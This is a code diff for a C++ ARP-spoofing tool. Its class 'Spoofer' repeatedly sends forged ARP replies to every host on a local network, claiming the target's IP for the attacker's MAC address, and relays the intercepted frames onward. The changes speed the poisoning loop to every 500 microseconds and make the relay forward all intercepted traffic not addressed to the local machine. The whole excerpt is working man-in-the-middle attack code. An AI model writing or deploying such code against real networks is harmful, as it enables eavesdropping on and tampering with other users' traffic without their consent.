@@ -34,6 +34,16 @@ void Spoofer::setTarget_mac(const HWAddress<6> &value)
     target_mac = value;
 }
 
+IPv4Address Spoofer::getLocal_ip() const
+{
+    return local_ip;
+}
+
+void Spoofer::setLocal_ip(const IPv4Address &value)
+{
+    local_ip = value;
+}
+
 Spoofer::Spoofer()
 {
     iface=iface.default_interface();
@@ -52,11 +62,13 @@ void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
             if(elem.first==target_ip)
                 continue;
 
+//            if(elem.first!="192.168.0.69")
+//                continue;
             arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);
-            arp.opcode(ARP::REPLY);
+
             sender.send(arp_infection,iface);
         }
-        sleep(1);
+        usleep(500);
     }
 }
 
@@ -93,9 +105,9 @@ bool Spoofer::relay(PDU &pdu)
     const IP& ip = pdu.rfind_pdu<IP>();
 
     //there is need to relay
-    if((ip.dst_addr()== target_ip) && (ethII.dst_addr() == local_mac))
+    if((ip.dst_addr() != local_ip) && (ethII.dst_addr() == local_mac))
     {
-        std::cout<<"Packet come"<<std::endl;
+
         //change dest mac to origin target mac
         ethII.dst_addr(target_mac);
 
@@ -104,8 +116,8 @@ bool Spoofer::relay(PDU &pdu)
         sender.send(pdu,iface);
         }catch(...)
         {
-            RawPDU &rawPDU = pdu.rfind_pdu<RawPDU>();
-            printByHexData(rawPDU.payload().data(),rawPDU.payload_size());
+//            RawPDU &rawPDU = pdu.rfind_pdu<RawPDU>();
+//            printByHexData(rawPDU.payload().data(),rawPDU.payload_size());
         }
     }
 
